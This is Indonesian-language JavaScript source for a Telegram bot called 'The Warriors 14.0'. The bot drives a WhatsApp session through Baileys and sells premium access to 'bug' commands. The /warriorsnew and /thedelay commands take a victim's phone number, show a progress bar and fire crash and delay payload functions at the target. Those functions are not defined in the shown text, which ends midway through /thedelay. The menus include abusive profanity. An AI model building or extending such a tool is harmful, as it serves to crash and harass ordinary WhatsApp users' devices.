const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require("fs");
const axios = require("axios");
const path = require("path");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    makeInMemoryStore,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./TheData/premiumuser.json";
const adminFile = "./TheData/adminuser.json";
const ownerFile = "./owneruser.json";
const TOKENS_FILE = "./tokens.json";
const ownerID = 7627777702; // Ganti ID owner kamu
const prosesImg = "https://files.catbox.moe/6ti13b.jpg";
//ISI PAKAI LINK FOTOMU
const successImg = "https://files.catbox.moe/6ti13b.jpg";
//ISI PAKAI LINK FOTOMU

let bots = [];

const bot = new Telegraf(BOT_TOKEN);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
//////// Fungsi blacklist user \\\\\\
const blacklist = ["isi_bebas"];
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
  "https://files.catbox.moe/6ti13b.jpg"
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "TheData", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}

function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

const Module = require("module");

function startBot() {
  console.clear();
  console.log(chalk.bold.red(`==============================================
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

  `));
  console.log(
    chalk.bold.green(`
[!]THE WARRIORS IS ONLINE
`));
}

///// --- Koneksi WhatsApp --- \\\\\
const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" }),
});

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`${chalk.green.bold(`
╭━─────────━⊱ 
┃❏━⊱ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗧𝗲𝗿𝗵𝘂𝗯𝘂𝗻𝗴
╰───────────────────`
        )}`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(chalk.bold.red(`
╭━─────────━⊱ 
┃❏━⊱ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗧𝗲𝗿𝗽𝘂𝘁𝘂𝘀
╰───────────────────
        `));
      if (shouldReconnect) {
        console.log(chalk.bold.yellow(`
╭━─────────━⊱ 
┃❏━⊱ 𝗠𝗲𝗻𝗴𝗵𝘂𝗯𝘂𝗻𝗴𝗸𝗮𝗻 𝗨𝗹𝗮𝗻𝗴
╰───────────────────
         ` ));
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu siapa? Lu bukan owner anjing kontol bangsat...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu Belum premium kentod...");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./TheData/admins.json", JSON.stringify(adminList));
};

//OWNER ADD
const addOwner = (userId) => {
  if (!ownerList.includes(userId)) {
    ownerList.push(userId);
    saveOwners();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeOwner = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveOwners = () => {
  fs.writeFileSync("./owneruser.json", JSON.stringify(ownerList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./TheData/admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("😂 Sendernya Mana Ngentot? Konekin Dlu pake /addsender 62xxx");
    return;
  }
  next();
};
/////////=========MENU UTAMA========\\\\\\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isOwner = ownerUsers.includes(userId);
  const chatId = ctx.chat.id;
  const isAdmin = adminUsers.includes(userId);
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>
╭━───━⊱ 𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬
┃❏━⊱ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @OBITOBOYS
┃❏━⊱ 𝐎𝐰𝐧𝐞𝐫: @Tiger_Reals1
┃❏━⊱ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 14.0
╰───────────────────
╭━───━⊱ 𝚂𝚃𝙰𝚃𝚄𝚂 𝚄𝚂𝙴𝚁 
┃❏━⊱ 𝐍𝐚𝐦𝐞: ${Name}
┃❏━⊱ 𝐀𝐜𝐜𝐞𝐬: ${isPremium ? '✅' : '❌'}
╰───────────────────
𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰 𝐇𝐞𝐫𝐞
</blockquote>
`;

  const mainKeyboard = [
     [
      {
        text: "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬",
        url: "https://t.me/AlboutObito",
      },
    ],
    [
      {
        text: "𝗢𝗯𝗶𝘁𝗼 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶",
        url: "https://t.me/informasitiger",
      },
    ],
    [
      {
        text: "𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬",
        callback_data: "bug_menu",
      },
    {
     text: "𝐎𝐰𝐧𝐞𝐫 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐥", 
     callback_data: "owner_menu", 
    }, 
    ],
    [
    {
     text: "𝐒𝐮𝐩𝐩𝐨𝐫𝐭", 
     callback_data: "thanks_to", 
      }, 
    ],
    [
    {
     text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐑", 
     url: "t.me/OBITOBOYS", 
      }, 
        {
     text: "༽ 𝗢𝘄𝗡𝗲𝗥 ༼", 
     url: "t.me/Tiger_Reals1", 
      }, 
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    }
  }) 
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>
╭━───━⊱ 𝙾𝚠𝚗𝚎𝚛 𝙼𝚎𝚗𝚞
┃❏━⊱ /addowner
┃❏━⊱ /delowner
┃❏━⊱ /addprem
┃❏━⊱ /delprem
┃❏━⊱ /delprem
┃❏━⊱ /cekprem
┃❏━⊱ /addadmin
┃❏━⊱ /deladmin 
┃❏━⊱ /setjeda
┃❏━⊱ /addsender 62xxx
┃❏━⊱ /delsession
┃❏━⊱ /add tanpa sender
╰───────────────────
</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "MAIN MENU", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
////handler thanks to
bot.action("thanks_to", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>
╭━───━⊱ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚃𝚘
┃❏━⊱ OBITO X TIGER
┃❏━⊱ SEREN 
┃❏━⊱ VAMPIRE
┃❏━⊱ XATANICAL
┃❏━⊱ WOLF
┃❏━⊱ PARADOKS 
┃❏━⊱ DARKNESS 
┃❏━⊱ OTA
┃❏━⊱ KILLER
┃❏━⊱ XRELLY
┃❏━⊱ ULYY
┃❏━⊱ AMEL
┃❏━⊱ RAA
┃❏━⊱ LINUX
┃❏━⊱ NAJWA
┃❏━⊱ AMIRA
╰───────────────────
</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "MAIN MENU", 
          callback_data: "back" 
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage =  `
<blockquote>
╭━───━⊱ 𝙱𝚞𝚐 𝙾𝚙𝚝𝚒𝚘𝚗
┃❏━⊱ /warriorsnew 62xxx
┃ #- Crash Infitinty
┃ #- Fc Wa Bisnis X Beta
┃
┃❏━⊱ /thedelay 62xxx
┃ #- Delay Invisible
┃ #- Ori / Bisnis
╰───────────────────
</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "MAIN MENU", 
        callback_data: "back"
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isOwner = ownerUsers.includes(userId);
  const isAdmin = adminUsers.includes(userId);
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>
╭━───━⊱ 𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬
┃❏━⊱ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @OBITOBOYS
┃❏━⊱ 𝐎𝐰𝐧𝐞𝐫: @Tiger_Reals1
┃❏━⊱ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 14.0
╰───────────────────
╭━───━⊱ 𝚂𝚃𝙰𝚃𝚄𝚂 𝚄𝚂𝙴𝚁 
┃❏━⊱ 𝐍𝐚𝐦𝐞: ${Name}
┃❏━⊱ 𝐀𝐜𝐜𝐞𝐬: ${isPremium ? '✅' : '❌'}
╰───────────────────
𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰 𝐇𝐞𝐫𝐞
</blockquote>
`;

  const mainKeyboard = [
     [
      {
        text: "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬",
        url: "https://t.me/AlboutObito",
      },
    ],
    [
      {
        text: "𝗢𝗯𝗶𝘁𝗼 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶",
        url: "https://t.me/informasitiger",
      },
      {
        text: "𝐓𝐡𝐞 𝐖𝐚𝐫𝐫𝐢𝐨𝐫𝐬",
        callback_data: "bug_menu",
      },
    {
     text: "𝐎𝐰𝐧𝐞𝐫 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐥", 
     callback_data: "owner_menu", 
    }, 
    ],
    [
    {
     text: "𝐒𝐮𝐩𝐩𝐨𝐫𝐭", 
     callback_data: "thanks_to", 
      }, 
    ],
    [
    {
     text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐑", 
     url: "t.me/OBITOBOYS", 
      }, 
        {
     text: "༽ 𝗢𝘄𝗡𝗲𝗥 ༼", 
     url: "t.me/Tiger_Reals1", 
      }, 
    ],
  ];

const media = {
  type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
    
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
////////// OWNER MENU \\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});

//////// END \\\\\\\


/// 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
bot.command("warriorsnew", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /command 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Prosessing
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[0]}

© The Warriors 14.0
\`\`\``,
    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
▢ Target: ${q}
▢ Status: Prosessing
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[i]}

© The Warriors 14.0
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 2; i++) {
    await CrlSql(sock, target);
    await R9X(sock, target);
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Successfully...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████] 100%

© The Warriors 14.0
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "CEK TARGET ‼️", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.command("thedelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /command 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Prosessing
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[0]}

© The Warriors 14.0
\`\`\``,
